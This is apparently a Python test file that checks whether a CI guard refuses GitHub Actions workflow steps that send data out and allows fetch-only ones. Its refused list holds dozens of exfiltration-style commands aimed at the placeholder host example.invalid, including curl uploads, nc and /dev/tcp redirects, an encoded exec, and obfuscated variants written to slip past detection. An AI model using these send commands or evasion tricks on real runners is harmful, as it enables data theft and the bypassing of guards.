"""Issue #511: outbound send commands in run: are publish paths (check_guard_placement must refuse them).

Each case writes one workflow into a temporary root and runs the placement check. Refused cases must raise; allowed
cases (fetch-only use of the same tools) must pass. The file has no upload step, so the scope layer decides it.
"""
from pathlib import Path
import json
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import artifact_guard as guard

try:
    import yaml  # noqa: F401
except ImportError:   # without PyYAML every refusal is a placeholder, so a pass would prove nothing
    raise SystemExit('PyYAML is required for the Issue #511 placement tests')

PERMISSIONS = 'permissions:\n  contents: read\n'


def workflow(run):
    step = f'      - run: {json.dumps(run)}\n'
    return f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n{step}'


def placement_refuses(text):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        path = root / '.github' / 'workflows' / 'ci.yml'
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding='utf-8', newline='')
        try:
            guard.check_guard_placement(root)
        except ValueError as error:
            return str(error)
    return None


REFUSED = [
    'curl -F f=@out.txt https://example.invalid/up',
    'curl --form f=@out.txt https://example.invalid/up',
    'curl -sSf -d @out.txt https://example.invalid/up',
    'curl -T out.txt https://example.invalid/up',
    'curl --upload-file out.txt https://example.invalid/up',
    'curl -XPOST https://example.invalid/up -d x',
    'curl -X POST https://example.invalid/up',
    'curl --request PUT https://example.invalid/up',
    'curl --json {} https://example.invalid/up',
    'curl -K cfg.txt',
    'wget --post-file=out.txt https://example.invalid/up',
    'wget --post-data a=b https://example.invalid/up',
    'wget --method=PUT --body-file=out.txt https://example.invalid/up',
    'git push origin v1',
    'git -C repo push origin v1',
    'git -c user.name=x push --tags',
    'git -c alias.p=push p',
    'gh gist create out.txt',
    'gh -R o/r release upload v1 out.txt',
    'gh api graphql -f query="mutation{createRelease}"',
    'gh api graphql -f query=@q.graphql',
    'gh api repos/o/r/issues -f title=x',
    'gh pr comment 1 --body x',
    'gh workflow run ci.yml',
    'nc example.invalid 80 < out.txt',
    'scp out.txt example.invalid:',
    'rsync -a out.txt example.invalid:/x',
    'ssh example.invalid cat > x',
    'python3 -c "import urllib.request; urllib.request.urlopen(\'https://example.invalid\')"',
    'python3 -c "import socket"',
    'python3 -c "import os; os.system(\'curl -d x h\')"',
    'node -e "fetch(\'https://example.invalid\', {method: \'POST\'})"',
    'timeout 5 curl -F f=@out.txt https://example.invalid/up',
    'sudo curl -d @out.txt https://example.invalid/up',
    'env -i curl -d @out.txt https://example.invalid/up',
    'nice -n 5 wget --post-file=out.txt https://example.invalid/up',
    'FOO=1 curl -d @out.txt https://example.invalid/up',
    'FOO="x y" curl -d @out.txt https://example.invalid/up',
    'bash -c "curl -F f=@out.txt https://example.invalid/up"',
    'sh -c \'git push origin v1\'',
    'echo $(curl -F f=@out.txt https://example.invalid/up)',
    'echo `curl -F f=@out.txt https://example.invalid/up`',
    'X=`curl -d @out.txt h`',
    'curl -sS https://example.invalid/x && curl -F f=@out.txt https://example.invalid/up',
    'curl -sS https://example.invalid/x || curl -F f=@out.txt https://example.invalid/up',
    'curl -sS https://example.invalid/x; curl -F f=@out.txt https://example.invalid/up',
    'curl -sS https://example.invalid/x | curl -T - https://example.invalid/up',
    '"cu"rl -F f=@out.txt https://example.invalid/up',
    'c\\url -F f=@out.txt https://example.invalid/up',
    '/usr/bin/curl -F f=@out.txt https://example.invalid/up',
    'CMD=curl; $CMD -F f=@out.txt https://example.invalid/up',
    'eval "curl -F f=@out.txt https://example.invalid/up"',
    'npm publish',
    'docker push example.invalid/x:1',
    'twine upload dist/*',
    'aws s3 cp out.txt s3://bucket/x',
    'if curl -d @out.txt https://example.invalid/up; then echo ok; fi',
    'env -S "curl -d @out.txt https://example.invalid/up"',
    'cat out.txt > /dev/tcp/example.invalid/80',
    'bash <<< "curl -F f=@out.txt https://example.invalid/up"',
    '/usr/bin/cu[r]l -F f=@out.txt https://example.invalid/up',
    '$(echo c)url -F f=@out.txt https://example.invalid/up',
    'find . -exec curl -F f=@out.txt https://example.invalid/up \\;',
    'setsid curl -d @out.txt https://example.invalid/up',
    'sshpass -p secret scp out.txt example.invalid:',
    'docker buildx build --push -t example.invalid/x:1 .',
    'python3 -m twine upload dist/x.whl',
    'yarn publish',
    'cargo publish',
    'git send-email 0001.patch',
    'tftp example.invalid -c put out.txt',
    'python3 -c "import base64; exec(base64.b64decode(\'aW1wb3J0IHNvY2tldA==\'))"',
    'python3 -c "import os; os.execvp(\'curl\', [\'curl\', \'-F\', \'f=@out.txt\', \'https://example.invalid/up\'])"',
    'Invoke-WebRequest -Method Post -InFile out.txt -Uri https://example.invalid/up',
    'curl.exe -F f=@out.txt https://example.invalid/up',
    'cat out.txt > /dev/"tcp"/example.invalid/80',
]

ALLOWED = [
    'curl -fsSL https://example.invalid/x -o out.txt',
    'curl -sS -X GET https://example.invalid/x',
    'curl --request GET https://example.invalid/x',
    'curl -sS https://example.invalid/x | sha256sum',
    'wget -q https://example.invalid/x -O out.txt',
    'wget --method=GET https://example.invalid/x',
    'git fetch origin',
    'git ls-remote origin',
    'git rev-parse HEAD',
    'git log --oneline -5',
    'git clone --depth 1 https://example.invalid/r.git',
    'gh api repos/o/r/rules/branches/main > out.json',
    'gh api "repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/attempts/1"',
    'gh api --method GET repos/o/r/issues',
    'gh run view 1 --json attempt',
    'gh gist view abc',
    'python3 -c "print(1)"',
    'python3 tools/check.py',
    'python3 tools/socket_probe.py',
    'echo curl -d x is text',
    'grep -r curl .github',
    'docker build -t x .',
    'make check',
    'cp out.txt "$RUNNER_TEMP/x"',
    'sha256sum out.txt',
    'x=$(git rev-parse HEAD)',
    'if git fetch origin; then echo ok; fi',
    'find . -name "*.py" -print',
]


class SendRefused(unittest.TestCase):
    def test_send_commands_refused(self):
        for run in REFUSED:
            with self.subTest(run=run):
                self.assertIsNotNone(placement_refuses(workflow(run)), run)

    def test_multiline_backslash_continuation_refused(self):
        run = 'curl -sS https://example.invalid/x \\\n  -F f=@out.txt https://example.invalid/up\n'
        self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_block_scalar_send_refused(self):
        text = (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n'
                '      - run: |\n          echo ok\n          git push origin v1\n')
        self.assertIsNotNone(placement_refuses(text))

    def test_python_heredoc_send_refused(self):
        run = "python3 - <<'EOF'\nimport urllib.request\nurllib.request.urlopen('https://example.invalid')\nEOF\n"
        self.assertIsNotNone(placement_refuses(workflow(run)))

    def test_python_heredoc_without_network_passes(self):
        self.assertIsNone(placement_refuses(workflow("python3 - <<'EOF'\nprint(1)\nEOF\n")))

    def test_gh_expression_python_still_passes(self):
        run = '"${{ steps.pyresolve.outputs.python }}" tools/check.py'
        self.assertIsNone(placement_refuses(workflow(run)))


class FetchOnlyAllowed(unittest.TestCase):
    def test_allowed_operations_pass(self):
        for run in ALLOWED:
            with self.subTest(run=run):
                self.assertIsNone(placement_refuses(workflow(run)), run)


if __name__ == '__main__':
    unittest.main()
